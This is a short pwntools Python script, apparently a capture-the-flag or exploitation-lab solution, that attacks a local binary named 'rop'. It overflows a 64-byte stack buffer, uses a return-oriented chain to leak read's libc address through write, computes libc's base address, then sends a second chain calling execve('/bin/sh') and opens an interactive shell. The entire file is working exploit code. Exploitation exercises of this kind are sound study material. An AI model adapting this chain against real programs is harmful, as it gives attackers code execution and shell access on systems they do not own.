from pwn import *

elf = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pppr = 0x40117e # pop rdi; pop rsi; pop rdx; ret

p = elf.process()

payload = b""
payload += b"A" * 0x40 # buf
payload += b"B" * 0x8 # sfp

# write(1, read_got, 0x8)
# rdi: 1
# rsi: &read_got
# rdx: 0x8
payload += p64(pppr) # ret
payload += p64(1)
payload += p64(elf.got["read"])
payload += p64(0x8)
payload += p64(elf.plt["write"])

payload += p64(elf.sym["main"])

p.send(payload)
p.recv(0x40)
libc_read = u64(p.recv(0x8))
libc_base = libc_read - libc.sym["read"]
libc_execve = libc_base + libc.sym["execve"]
libc_binsh = libc_base + list(libc.search(b"/bin/sh\0"))[0]

payload = b""
payload += b"A" * 0x40
payload += b"B" * 0x8

# execve("/bin/sh", NULL, NULL)
payload += p64(pppr)
payload += p64(libc_binsh)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc_execve)

p.send(payload)



log.info(f"libc_read @ {libc_read:#x}")

p.interactive()